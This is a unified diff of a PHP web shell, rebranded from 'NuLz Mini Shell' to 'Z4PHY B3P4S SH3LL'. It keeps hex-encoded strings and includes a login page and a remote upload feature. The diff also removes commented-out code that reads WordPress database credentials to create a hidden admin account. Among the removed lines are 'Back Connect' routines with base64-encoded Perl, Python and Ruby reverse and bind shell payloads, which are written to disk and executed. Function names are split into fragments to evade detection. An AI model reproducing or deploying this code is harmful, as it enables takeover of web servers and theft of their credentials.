@@ -1,6 +1,6 @@
 <?php
 /*
-Need Something? https://t.me/zaynphantomhive
+R3C0D3 BY https://t.me/zaynphantomhive
 */
 
 //head
@@ -39,7 +39,7 @@ if (isset($_GET['downloadfile'])) {
     }
 }
 //config shell
-$s_he_ll_Name = "\x4e\x75\x4c\x7a\x20\x4d\x69\x6e\x69\x20\x53\x68\x65\x6c\x6c";
+$s_he_ll_Name = "Z4"."PH"."Y "."B3"."P4S"." S"."H3"."LL";
 $s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x70\x6e\x67";
 $s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x69\x63\x6f";
 $s_he_ll_Footer = "\x3c\x66\x6f\x6f\x74\x65\x72\x20\x63\x6c\x61\x73\x73\x3d\x22\x62\x67\x2d\x74\x72\x61\x6e\x73\x70\x61\x72\x65\x6e\x74\x20\x74\x65\x78\x74\x2d\x63\x65\x6e\x74\x65\x72\x20\x6c\x67\x3a\x74\x65\x78\x74\x2d\x63\x65\x6e\x74\x65\x72\x22\x3e\x3c\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x22\x70\x2d\x34\x20\x66\x6f\x6e\x74\x2d\x62\x6f\x6c\x64\x20\x74\x65\x78\x74\x2d\x63\x65\x6e\x74\x65\x72\x20\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x20\x64\x61\x72\x6b\x3a\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x22\x3e\xc2\xa9\x20\x32\x30\x32\x32\x20\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x3a\x3c\x61\x20\x63\x6c\x61\x73\x73\x3d\x22\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x38\x30\x30\x20\x64\x61\x72\x6b\x3a\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x34\x30\x30\x22\x20\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x22\x3e\x4e\x75\x4c\x7a\x20\x48\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x3c\x2f\x61\x3e\x3c\x2f\x64\x69\x76\x3e\x3c\x2f\x66\x6f\x6f\x74\x65\x72\x3e";
@@ -504,7 +504,7 @@ if (empty($_SESSION['login'])) {
     }
 
     body {
-        background-image: url('https://raw.githubusercontent.com/z4phyr/z4p-code/main/assets/scleton.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
+        background-image: url('https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/me.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
         background-position: center;
         background-size: cover;
         background-repeat: no-repeat;
@@ -771,7 +771,7 @@ if (empty($_SESSION['login'])) {
 <body>
     <div class="terminal">
         <div class="headerTerm">
-            <img src="https://raw.githubusercontent.com/z4phyr/z4p-code/main/assets/terminal.png"
+            <img src="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/terminal.png"
                 alt="terminal" /><span>Terminal</span>
             <strong>
                 <?= $s_he_ll_Name ?> Login
@@ -791,7 +791,7 @@ if (empty($_SESSION['login'])) {
     <script type="text/javascript">
     var root = document.querySelector(".root");
     var name = `
-                                ╭──[root@z4phyXNulz]<br>
+                                ╭──[root@Z4phyXNulz]<br>
                                 ╰──➤
                                 `;
     root.innerHTML = name;
@@ -801,13 +801,13 @@ if (empty($_SESSION['login'])) {
         loop: true,
         delay: 150,
     });
-    /*NuLz Ganteng*/
+    /*R3C0D3 BY Z4PHY*/
     typewriter
         .pauseFor(500)
-        .typeString("Selamat datang tuan")
+        .typeString("Sweet Touch By Z4phy ~!")
         .pauseFor(2000)
         .deleteChars(26)
-        .typeString("ada yang bisa di bantu ?")
+        .typeString("Ada Yang Bisa Di Bantu Tuan?")
         .pauseFor(2000)
         .start();
     </script>
@@ -865,7 +865,7 @@ $path = str_replace("\\", "/", $path);
     <!-- Flowbite -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css" rel="stylesheet" />
     <!-- For Text Editor -->
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/z4p-code/main/css/style.css">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/css/style.css">
     <style id="style2" type="text/css"></style>
     <link id="theme1" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/vs2015.min.css" rel="stylesheet" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js" type="text/javascript"></script>
@@ -1929,7 +1929,7 @@ $path = str_replace("\\", "/", $path);
         echo '<form class="mx-2 my-2" action="" method="POST">';
         echo '<label class="block w-3/6 ml-2 flex flex-col flex-wrap">
             <span class="block">Remote Upload Via Url</span>
-            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-full border border-slate-300 rounded-md mb-2 py-2 pl-4 shadow-sm placeholder:text-gray-600" name="remoteup" placeholder="https://nulz.go.id/nulz.txt">
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-full border border-slate-300 rounded-md mb-2 py-2 pl-4 shadow-sm placeholder:text-gray-600" name="remoteup" placeholder="http://z4phy.fbi.gov">
             <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 border border-slate-300 rounded-md mt-2 py-2 pl-4 shadow-sm placeholder:text-gray-600" name="remotefname" placeholder="saved.txt">
             </label>';
         echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
@@ -1940,178 +1940,8 @@ $path = str_replace("\\", "/", $path);
     if (isset($_GET['addNewAdmin'])) {
         echo '<span class="mx-4 mb-4 mt-4 ubuntu-mono '.$txtYellow.'">Sorry... The Feature <font class="'.$txtWhite.'">Add New Admin</font> Is Maintance!</span>';
     }
-    //Maintance
-    // if (isset($_GET['addNewAdmin'])) {
-    //     echo '
-    //     <form class="md:w-2/4 w-full w-auto mx-4 my-8" action="" method="POST">
-    //         <div class="getconfig my-4 w-full flex flex-row flex-nowrap items-center gap-4 fs-xs">
-    //             <label for="config_path" class="fs-xs text-center">wp config</label>
-    //             <input type="text" id="config_path" name="config_path" class="config h-5 w-64 py-4 bg-transparent border-blue-500 rounded fs-xs" value="'.$_SERVER['DOCUMENT_ROOT'].'">
-    //             <button type="submit" name="btn-getconfig" class="btn-getconfig text-white poppins bg-blue-600 hover:bg-blue-800 px-4 py-1 rounded mx-4 fs-xs">Get Config</button>
-    //         </div>
-    //     </form>';
-    //     if (isset($_POST['btn-getconfig'])) {
-    //         $f_exist = 'fi'.'le_'.'exis'.'ts';
-    //         $config_path = htmlspecialchars($_POST['config_path']);
-    //         $the_config_path = $config_path.'/wp-config.php';
-    //         if ($f_exist($the_config_path)) {
-    //             $config_content = file_get_contents($the_config_path);
-    //             function getDbHost($config_content) {
-    //                 if (preg_match("/define\(\s*'DB_HOST',\s*'([^']+)'\s*\);/", $config_content, $matches)) {
-    //                     $db_host = $matches[1];
-    //                     echo $db_host;
-    //                 }
-    //             }
-                
-    //             echo '<form class="md:w-2/4 w-full w-auto mx-4 my-8" action="" method="POST">
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_host" id="db_host" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="'.getDbHost().'" />
-    //                         <label for="db_host" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB HOST</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_name" id="db_name" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_name" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB NAME</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_user" id="db_user" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_user" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB USER</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_pass" id="db_pass" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_pass" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB PASS</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_pass" id="db_pass" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_pass" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">TABLE PREFIX</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="admin_username" id="admin_username" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="superadmin_example" />
-    //                         <label for="admin_username" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Username</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="password" name="admin_password" id="admin_password" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="nulz_example@1337" />
-    //                         <label for="admin_password" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Password</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="email" name="admin_email" id="admin_email" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="nulz404@fbi.gov" />
-    //                         <label for="admin_email" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Email</label>
-    //                     </div>
-    //                     <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Submit</button>
-    //                  </form>';
-    //         } else {
-    //             echo '<span class="mx-4 mb-4 ubuntu-mono '.$txtYellow.'">Sorry... The Config Path <font class="'.$txtWhite.'">'.$config_path.'</font> Not Valid</span>';
-    //         }
-    //     }
-    // }
     if (isset($_GET['backConnect'])) {
         echo '<span class="mx-4 mb-4 mt-4 ubuntu-mono '.$txtYellow.'">Sorry... The Feature <font class="'.$txtWhite.'">Back Connect</font> Is Maintance!</span>';
-        // if (isset($_POST['btn-bc'])) {
-        //     $f_put = 'f'.'pu'.'ts';
-        //     $f_get = 'f'.'ge'.'ts';
-        //     $f_w = 'f'.'wr'.'ite';
-        //     $f_sock = 'f'.'so'.'ck'.'op'.'en';
-        //     $f_cls = 'f'.'cl'.'os'.'e';
-        //     $slp = 's'.'le'.'ep';
-        //     $glb = 'g'.'l'.'o'.'b';
-        //     $p_cls = 'p'.'cl'.'os'.'e';
-        //     $hayoloh = 'h'.'tm'.'lsp'.'ec'.'ial'.'ch'.'ar'.'s';
-        //     $func_exist = 'f'.'un'.'ct'.'io'.'n'.'_'.'e'.'xi'.'st'.'s';
-        //     $g_host_name = 'g'.'et'.'hos'.'t'.'b'.'yn'.'a'.'me';
-        //     $bc_host = $hayoloh($_POST['bc_host']);
-        //     $bc_port = $hayoloh($_POST['bc_port']);
-        //     $bc_with = $hayoloh($_POST['bc_with']);
-        //     $bc_failed = '<span class="'.$txtYellow.'">Sorry... Failed To BackConnect</span>';
-        //     echo '<div class="my-4 mx-5 '.$txtWhite.'">';
-        //     if ($bc_with == 'php') {
-        //         $bcphp = $f_put('IyEvdXNyL2Jpbi9wZXJsCiRTSEVMTD0iL2Jpbi9zaCAtaSI7CmlmIChAQVJHViA8IDEpIHsgZXhpdCgxKTsgfQp1c2UgU29ja2V0Owpzb2NrZXQoUywmUEZfSU5FVCwmU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKSB8fCBkaWUgIkNhbnQgY3JlYXRlIHNvY2tldFxuIjsKc2V0c29ja29wdChTLFNPTF9TT0NLRVQsU09fUkVVU0VBRERSLDEpOwpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7Cmxpc3RlbihTLDMpIHx8IGRpZSAiQ2FudCBsaXN0ZW4gcG9ydFxuIjsKd2hpbGUoMSkgewoJYWNjZXB0KENPTk4sUyk7CglpZighKCRwaWQ9Zm9yaykpIHsKCQlkaWUgIkNhbm5vdCBmb3JrIiBpZiAoIWRlZmluZWQgJHBpZCk7CgkJb3BlbiBTVERJTiwiPCZDT05OIjsKCQlvcGVuIFNURE9VVCwiPiZDT05OIjsKCQlvcGVuIFNUREVSUiwiPiZDT05OIjsKCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsKCQljbG9zZSBDT05OOwoJCWV4aXQgMDsKCX0KfQ==');
-        //         $wphp = $f_w('nulz_bc_php.pl', 'w');
-        //         if ($wphp) {
-        //             $f_sock($wphp, $bcphp);
-        //             $out = NuLzCmd("perl nulz_bc_php.pl $bc_port 1>/dev/null 2>&1 &");
-        //             $slp(1);
-        //             $res = "<pre>$out\n".NuLzCmd("ps aux | grep nulz_bc_php.pl")."</pre>";
-        //             $glp('nulz_bc_php.pl');
-        //             return $res;
-        //         } else {
-        //             echo $bc_failed;
-        //         }
-        //     } else if ($bc_with == 'python') {
-        //         $bcpy = $f_put('IyEvdXNyL2Jpbi9weXRob24KI1VzYWdlOiBweXRob24gZmlsZW5hbWUucHkgSE9TVCBQT1JUCmltcG9ydCBzeXMsIHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKaXBsbyA9IHN5cy5hcmd2WzFdCnBvcnRsbyA9IGludChzeXMuYXJndlsyXSkKc29ja2V0LnNldGRlZmF1bHR0aW1lb3V0KDYwKQpkZWYgcHliYWNrY29ubmVjdCgpOgogIHRyeToKICAgIGptYiA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkKICAgIGptYi5zZW5kKCcnJ1xuTnVMeiAtIFB5dGhvbiBCYWNrQ29ubmVjdFxuXG4nJycpCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMSkKICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQogICAgc2hlbGwgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkKICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6CiAgICBwcmludCAiVGltT3V0IgogIGV4Y2VwdCBzb2NrZXQuZXJyb3IsIGU6CiAgICBwcmludCAiRXJyb3IiLCBlCnB5YmFja2Nvbm5lY3QoKQ==');
-        //         $wpy = $f_w('nulz_bc.py', 'w');
-        //         if ($wpy) {
-        //             $f_sock($wpy, $bcpy);
-        //             $out = NuLzCmd("python nulz_bc.py $bc_host $bc_port");
-        //             $slp(1);
-        //             $res = "<pre>$out\n".NuLzCmd("ps aux | grep nulz_bc.py")."</pre>";
-        //             $glp('nulz_bc.py');
-        //             return $res;
-        //         } else {
-        //             echo $bc_failed;
-        //         }
-        //     } else if ($bc_with == 'perl') {
-        //         $bcpl = $f_put('IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKc3lzdGVtKCcvYmluL3NoIC1pJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKTs=');
-        //         $wpl = $f_w('nulz_bc.pl', 'w');
-        //         if ($wpl) {
-        //             $f_sock($wpl, $bcpl);
-        //             $out = NuLzCmd("perl nulz_bc.pl $bc_port 1>/dev/null 2>&1 &");
-        //             $slp(1);
-        //             $res = "<pre>$out\n".NuLzCmd("ps aux | grep nulz_bc.pl")."</pre>";
-        //             $glp('nulz_bc.pl');
-        //             return $res;
-        //         }
-        //     } else if ($bc_with == 'ruby') {
-        //         $bcrb = $f_put('IyEvdXNyL2Jpbi9lbnYgcnVieQojIE51THo0MDQgKGMpIDIwMTgKIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsCiMgTnVMejQwNApyZXF1aXJlICdzb2NrZXQnCnJlcXVpcmUgJ3BhdGhuYW1lJwoKZGVmIHVzYWdlCglwcmludCAiYmluZCA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XVxyXG4iCglwcmludCAicmV2ZXJzZSA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XSBbaG9zdF1cclxuIgplbmQKCmRlZiBzdWNrcwoJc3Vja3MgPSBmYWxzZQoJaWYgUlVCWV9QTEFURk9STS5kb3duY2FzZS5tYXRjaCgnbXN3aW58d2lufG1pbmd3JykKCQlzdWNrcyA9IHRydWUKCWVuZAoJcmV0dXJuIHN1Y2tzCmVuZAoKZGVmIHJlYWxwYXRoKHN0cikKCXJlYWwgPSBzdHIKCWlmIEZpbGUuZXhpc3RzPyhzdHIpCgkJZCA9IFBhdGhuYW1lLm5ldyhzdHIpCgkJcmVhbCA9IGQucmVhbHBhdGgudG9fcwoJZW5kCglpZiBzdWNrcwoJCXJlYWwgPSByZWFsLmdzdWIoL1wvLywiXFwiKQoJZW5kCglyZXR1cm4gcmVhbAplbmQKCmlmIEFSR1YubGVuZ3RoID09IDEKCWlmIEFSR1ZbMF0gPX4gL15bMC05XXsxLDV9JC8KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQoJZWxzZQoJCXVzYWdlCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBUaGlzIFBvcnQgaXMgTm90IFZhbGlkXHJcbiIKCQlleGl0CgllbmQKCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpCglzID0gc2VydmVyLmFjY2VwdAoJcG9ydCA9IHMucGVlcmFkZHJbMV0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdCglzLnByaW50ICIqKiogTnVMeiAtIFJ1YnkgQmFja2Nvbm5lY3RcclxuIgoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iCgliZWdpbgoJCWlmIG5vdCBzdWNrcwoJCQlmID0gcy50b19pCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLGYsZixmKQoJCWVsc2UKCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMKCQkJCXJhaXNlIGVycm9yQnJvIGlmIGxpbmUgPX4gL15kaWVccj8kLwoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiIKCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pCgkJCQkJCWxpbmUgPSBsaW5lLmdzdWIoL2NkIC9pLCAnJykuY2hvbXAKCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkKCQkJCQkJCURpci5jaGRpcihsaW5lKQoJCQkJCQllbmQKCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iCgkJCQkJZWxzaWYgbGluZSA9fiAvXHc6LiovaQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkKCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQoJCQkJCQllbmQKCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iCgkJCQkJZWxzZQoJCQkJCQlJTy5wb3BlbihsaW5lLCJyIil7fGlvfHMucHJpbnQgaW8ucmVhZCArICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiJ9CgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgkJZW5kCglyZXNjdWUgZXJyb3JCcm8KCQlwdXRzICIqKiogI3tuYW1lfToje3BvcnR9IGRpc2Nvbm5lY3RlZCIKCWVuc3VyZQoJCXMuY2xvc2UKCQlzID0gbmlsCgllbmQKZWxzaWYgQVJHVi5sZW5ndGggPT0gMgoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLwoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pCgkJaG9zdCA9IEFSR1ZbMV0KCWVsc2lmIEFSR1ZbMV0gPX4gL15bMC05XXsxLDV9JC8KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQoJCWhvc3QgPSBBUkdWWzBdCgllbHNlCgkJdXNhZ2UKCQlwcmludCAiXHJcbioqKiBlcnJvciA6IFRoaXMgUG9ydCBpcyBOb3QgVmFsaWRcclxuIgoJCWV4aXQKCWVuZAoJcyA9IFRDUFNvY2tldC5uZXcoIiN7aG9zdH0iLCBwb3J0KQoJcG9ydCA9IHMucGVlcmFkZHJbMV0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdCglzLnByaW50ICIqKiogTnVMeiAtIFJ1YnkgQmFja2Nvbm5lY3RcclxuIgoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSIKCWJlZ2luCgkJaWYgbm90IHN1Y2tzCgkJCWYgPSBzLnRvX2kKCQkJZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIFw8XCYlZCBcPlwmJWQgMlw+XCYlZCIsIGYsIGYsIGYpCgkJZWxzZQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiIKCQkJd2hpbGUgbGluZSA9IHMuZ2V0cwoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIgoJCQkJCWlmIGxpbmUgPX4gL2NkIC4qL2kKCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcAoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkKCQkJCQkJCWxpbmUgPSByZWFscGF0aChsaW5lKQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpCgkJCQkJCWVuZAoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiIKCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUuY2hvbXApCgkJCQkJCWVuZAoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiIKCQkJCQllbHNlCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0KCQkJCQllbmQKCQkJCWVuZAoJCQllbmQKCQllbmQKCXJlc2N1ZSBlcnJvckJybwoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIgoJZW5zdXJlCgkJcy5jbG9zZQoJCXMgPSBuaWwKCWVuZAplbHNlCgl1c2FnZQoJZXhpdAplbmQ=');
-        //         $wrb = $f_w('nulz_bc.rb', 'w');
-        //         if ($wrb) {
-        //             $f_sock($wrb, $bcrb);
